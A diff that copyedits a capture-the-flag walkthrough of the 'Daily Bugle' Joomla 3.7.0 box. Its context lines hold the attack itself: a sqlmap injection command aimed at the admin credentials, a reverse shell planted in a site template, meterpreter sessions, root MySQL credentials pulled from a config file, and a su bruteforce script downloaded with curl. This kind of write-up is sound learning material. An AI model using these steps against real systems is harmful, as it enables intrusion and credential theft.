@@ -111,10 +111,10 @@ root@kali:~# searchsploit -w joomla | grep 3.7.0
 Joomla! 3.7.0 - 'com_fields' SQL Injection    | https://www.exploit-db.com/exploits/42033
 ```
 
-This yielded a single sql injection vulnerability that abused a parameter in the com_fields component. Specifically, this exploit called out that this component was vulnerable to an error-based injection as well as a time-based and boolean-based blind injection. Further information on the specific vulnerability can be found on the [sucuri blog](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html).
+This yielded a single sql injection vulnerability that exploited a parameter in the com_fields component. Specifically, it identified that this component was vulnerable to an error-based injection as well as a time-based and boolean-based blind injection. Further information on the specific vulnerability can be found on the [sucuri blog](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html).
 
 ### Mapping the database
-I decided to try to map out the database to see if I could leak the admin credentials through one of these injection methods. To start, I ran a `sqlmap` command with the `TEB` techniques, representing each of the identified techniques in the vulnerability listing, and the `--dbs` flag to attempt to identify the joomla database. I've truncated some of the output to save space. However it's worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.
+I decided to try to map out the database to see if I could leak the admin credentials through one of these injection methods. To start, I ran a `sqlmap` command with the `TEB` techniques, representing each of the identified techniques in the vulnerability listing, and the `--dbs` flag to attempt to identify the joomla database. I've truncated some of the output to save space. It's worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.
 
 ```
 msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TEB --dbs
@@ -178,7 +178,7 @@ available databases [5]:
 [*] ending @ 21:23:34 /2020-11-27/
 ```
 
-This eventually identified valid injection techniques which could be used to further refine the `sqlmap` command. It additionally identified that the joomla database was in fact called `joomla`.
+This eventually identified valid injection techniques which could be used to further refine the `sqlmap` command. It also confirmed that the joomla database was in fact called `joomla`.
 
 With this in mind, I was able to refine my `sqlmap` command to attempt to map the tables in the `joomla` database. Again, the output was truncated for space. While this identified many tables, I've included only a few of the most interesting.
 
@@ -233,7 +233,7 @@ back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
 [*] ending @ 21:26:37 /2020-11-27/
 ```
 
-With a `#__users` table now identified, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to try to identify a set of columns for the table to query against. Luckily, the schema for the `users` table for joomla `3.7.0` was readily available so I created a wordlist using the column names.
+With a `#__users` table now identified, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to provide the columns of the table. Luckily, the schema for the `users` table for joomla `3.7.0` was readily available so I created a wordlist using the column names.
 
 ```
 root@kali:~/ctf# cat table_schema.txt 
@@ -381,7 +381,7 @@ Payload size: 1114 bytes
 
 ![daily bugle shell injection](/img/daily_bugle_http_shell_in_template.png)
 
-I then opened the index.php template, saved the original contents to a backup file and copied the shell into the now empty body of the template. Prior to saving and executing I stageg up my listener to catch the incoming shell.
+I then opened the index.php template, saved the original contents to a backup file and copied the shell into the now empty body of the template. Prior to saving and executing I staged up my listener to catch the incoming shell.
 
 
 ```
@@ -491,7 +491,7 @@ msf5 post(multi/manage/shell_to_meterpreter) > sessions -k 1
 [*] 10.10.162.223 - Meterpreter session 1 closed.
 ```
 
-Once I had a stable shell established, I killed the original shell and quickly replaced the exploited template with it's original contents before verifying that I was now able to see the original, unmodified index page.
+Once I had a stable shell established, I killed the original shell and quickly replaced the exploited template with its original contents before verifying that I was now able to see the original, unmodified index page.
 
 ![daily bugle restored index](/img/daily_bugle_http_replaced_landing_page.png)
 
@@ -527,7 +527,7 @@ meterpreter > download 10.10.162.223_enum.txt /root/ctf/
 [*] download   : 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
 ```
 
-The enumeration gave yielded a few pieces of information that seemed worthwhile, a username `jjameson` and a set of root credentials for mysql DB from the `/var/www/html/configuration.php` file. 
+The enumeration yielded a few pieces of information that seemed useful: a username `jjameson` and a set of root credentials for mysql DB from the `/var/www/html/configuration.php` file. 
 
 
 ```
@@ -550,7 +550,7 @@ root@kali:~/ctf# echo 'nv5uz9r3ZEDzVjNu' >> ./wordlists/dailybugle.txt
 ```
 
 ### Horizontal local privilege escalation
-Now that I had identified the `jjameson` user as a potential next target I decided to attempt to escalate locally using a small, but immensely useful, bash script from Carlos Polop that bruteforces `su`. I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transferred this over to the host over a local http webserver. While not shown, `suBF.sh` was transfered to the host over the meterpreter session.
+Now that I had identified the `jjameson` user as a potential next target I decided to attempt to escalate locally using a small, but immensely useful, bash script from Carlos Polop that bruteforces `su`, [su-bruteforce](https://github.com/carlospolop/su-bruteforce). I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transferred this over to the host over a local http webserver. While not shown, `suBF.sh` was transfered to the host over the meterpreter session.
 
 ```
 root@kali:~/ctf# curl -sO https://raw.githubusercontent.com/carlospolop/su-bruteforce/master/suBF.sh
